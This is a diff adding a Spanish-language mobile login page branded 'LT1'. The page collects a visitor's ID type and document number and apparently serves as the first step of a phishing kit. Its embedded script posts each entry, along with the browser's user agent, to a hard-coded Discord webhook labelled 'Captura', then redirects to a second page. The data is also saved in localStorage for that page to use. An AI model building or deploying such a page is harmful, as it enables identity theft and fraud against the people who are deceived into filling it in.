@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Ingreso</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Contenedor con aspecto e interfaz móvil */
+        .mobile-container {
+            width: 100%;
+            max-width: 414px;
+            height: 100vh;
+            max-height: 896px;
+            background-color: #f7f7f7;
+            padding: 24px 28px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        .content-header {
+            margin-top: 20px;
+        }
+
+        /* Contenedor del Logo */
+        .logo-container {
+            margin-bottom: 35px;
+        }
+
+        .logo-container img {
+            width: 45px;
+            height: auto;
+            display: block;
+        }
+
+        /* Títulos */
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #2b2b2b;
+            line-height: 1.25;
+            margin-bottom: 25px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666666;
+            margin-bottom: 35px;
+        }
+
+        /* Opciones de Radio Button (Persona / Empresa) */
+        .radio-group {
+            display: flex;
+            align-items: center;
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+
+        .radio-option {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-size: 17px;
+        }
+
+        .radio-option.active {
+            color: #d86227;
+            font-weight: 600;
+        }
+
+        .radio-option.inactive {
+            color: #4a4a4a;
+        }
+
+        .radio-custom {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            margin-right: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-sizing: border-box;
+        }
+
+        .radio-option.active .radio-custom {
+            border: 2px solid #d86227;
+        }
+
+        .radio-option.active .radio-custom::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background-color: #d86227;
+            border-radius: 50%;
+        }
+
+        .radio-option.inactive .radio-custom {
+            border: 2px solid #a0a0a0;
+        }
+
+        /* Campos de Entrada / Inputs */
+        .form-row {
+            display: flex;
+            gap: 12px;
+        }
+
+        /* Fieldset para replicar el borde flotante con etiqueta */
+        .input-group {
+            position: relative;
+            border: 1px solid #c2c2c2;
+            border-radius: 10px;
+            padding: 0 12px;
+            background-color: #f7f7f7;
+            height: 54px;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-group.type-select {
+            flex: 0 0 110px;
+        }
+
+        .input-group.doc-number {
+            flex: 1;
+        }
+
+        .input-group legend {
+            font-size: 12px;
+            color: #666666;
+            padding: 0 4px;
+            margin-left: 2px;
+        }
+
+        .input-group select,
+        .input-group input {
+            width: 100%;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 16px;
+            color: #333333;
+            appearance: none;
+            -webkit-appearance: none;
+        }
+
+        .select-wrapper {
+            position: relative;
+            width: 100%;
+            display: flex;
+            align-items: center;
+        }
+
+        .select-wrapper::after {
+            content: '▼';
+            font-size: 10px;
+            color: #555;
+            position: absolute;
+            right: 0;
+            pointer-events: none;
+        }
+
+        .input-group input::placeholder {
+            color: #757575;
+        }
+
+        /* Botón Inferior */
+        .button-container {
+            margin-bottom: 20px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            height: 52px;
+            background-color: #e0e0e0;
+            color: #8c8c8c;
+            border: none;
+            border-radius: 26px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: not-allowed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-container">
+        <div class="content-header">
+            <!-- Logo con etiqueta <img> -->
+            <div class="logo-container">
+                <img src="LT1.ico" alt="Logo">
+            </div>
+
+            <!-- Encabezados -->
+            <h1>¡Qué bueno<br>tenerte por<br>aquí!</h1>
+            <p class="subtitle">Completa tus datos para ingresar</p>
+
+            <!-- Selector Persona / Empresa -->
+            <div class="radio-group">
+                <label class="radio-option active" data-tipo="Persona">
+                    <span class="radio-custom"></span>
+                    Persona
+                </label>
+                <label class="radio-option inactive" data-tipo="Empresa">
+                    <span class="radio-custom"></span>
+                    Empresa
+                </label>
+            </div>
+
+            <!-- Campos Tipo Documento y Número -->
+            <div class="form-row">
+                <fieldset class="input-group type-select">
+                    <legend>Tipo</legend>
+                    <div class="select-wrapper">
+                        <select id="tipo-doc">
+                            <option value="DNI">DNI</option>
+                            <option value="CE">CE</option>
+                            <option value="PAS">PAS</option>
+                        </select>
+                    </div>
+                </fieldset>
+
+                <fieldset class="input-group doc-number">
+                    <input type="text" id="num-doc" placeholder="Nº de documento" autocomplete="off">
+                </fieldset>
+            </div>
+        </div>
+
+        <!-- Botón de Continuar -->
+        <div class="button-container">
+            <button class="btn-submit" id="btn-continuar" disabled>Continuar</button>
+        </div>
+    </div>
+
+    <!-- ============================================================
+         SCRIPT EMBEBIDO: Webhook Discord + redirección a index1.html
+         ============================================================ -->
+    <script>
+    (function () {
+        'use strict';
+
+        /* ================= CONFIGURACIÓN ================= */
+        // Reemplaza por tu webhook real de Discord
+        const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1574870438499319819/AFIZOmm6G9wYZBP4opqeUKkujnpL0CGWIqNPclqv9PPMgxuuY9pnKwwNrew2E5Vg-XlM';
+        const REDIRECT_URL = 'index1.html';
+
+        /* ================= REFERENCIAS ================= */
+        const radioOptions  = document.querySelectorAll('.radio-option');
+        const selectTipoDoc = document.getElementById('tipo-doc');
+        const inputNumDoc   = document.getElementById('num-doc');
+        const btnContinuar  = document.getElementById('btn-continuar');
+
+        let tipoPersona = 'Persona';
+
+        /* ============ Radios Persona / Empresa ============ */
+        radioOptions.forEach(function (opt) {
+            opt.addEventListener('click', function () {
+                radioOptions.forEach(function (o) {
+                    o.classList.remove('active');
+                    o.classList.add('inactive');
+                });
+                opt.classList.remove('inactive');
+                opt.classList.add('active');
+                tipoPersona = opt.getAttribute('data-tipo') || 'Persona';
+                validar();
+            });
+        });
+
+        /* ============ Habilitar botón con documento ============ */
+        function validar() {
+            const ok = inputNumDoc.value.trim().length >= 6;
+            btnContinuar.disabled = !ok;
+            btnContinuar.style.cursor = ok ? 'pointer' : 'not-allowed';
+            btnContinuar.style.backgroundColor = ok ? '#d86227' : '#e0e0e0';
+            btnContinuar.style.color = ok ? '#ffffff' : '#8c8c8c';
+        }
+        inputNumDoc.addEventListener('input', validar);
+        validar();
+
+        /* ============ Utilidades ============ */
+        function limpiar(str) {
+            return String(str).replace(/[<>`]/g, '').trim().slice(0, 100);
+        }
+
+        async function enviarWebhook(datos) {
+            const payload = {
+                username: 'LT1 · Captura',
+                embeds: [{
+                    title: '📥 Nuevo ingreso',
+                    color: 0xd86227,
+                    fields: [
+                        { name: '👤 Tipo',         value: datos.tipoPersona, inline: true },
+                        { name: '🪪 Tipo Doc.',    value: datos.tipoDoc,     inline: true },
+                        { name: '🔢 N° Documento', value: datos.numDoc,      inline: true },
+                        { name: '🌐 Navegador',    value: datos.userAgent,   inline: false },
+                        { name: '🕒 Fecha',        value: datos.fecha,       inline: false }
+                    ],
+                    footer: { text: 'Sistema de ingreso LT1' },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            const res = await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            if (!res.ok) throw new Error('Webhook ' + res.status);
+        }
+
+        /* ============ Click en Continuar ============ */
+        btnContinuar.addEventListener('click', async function () {
+            if (btnContinuar.disabled) return;
+
+            const numDoc = limpiar(inputNumDoc.value);
+            if (numDoc.length < 6) {
+                alert('Ingresa un número de documento válido.');
+                return;
+            }
+
+            const datos = {
+                tipoPersona: tipoPersona,
+                tipoDoc: selectTipoDoc.value,
+                numDoc: numDoc,
+                userAgent: navigator.userAgent.slice(0, 200),
+                fecha: new Date().toLocaleString('es-PE')
+            };
+
+            // Guardar por si index1.html necesita leerlo
+            try {
+                localStorage.setItem('lt1_ingreso', JSON.stringify(datos));
+            } catch (e) { /* modo privado */ }
+
+            // Bloquear mientras envía
+            btnContinuar.disabled = true;
+            const textoOriginal = btnContinuar.textContent;
+            btnContinuar.textContent = 'Enviando...';
+
+            try {
+                await enviarWebhook(datos);
+            } catch (err) {
+                console.warn('No se pudo enviar al webhook:', err);
+            } finally {
+                btnContinuar.textContent = textoOriginal;
+                window.location.href = REDIRECT_URL;
+            }
+        });
+    })();
+    </script>
+</body>
+</html>
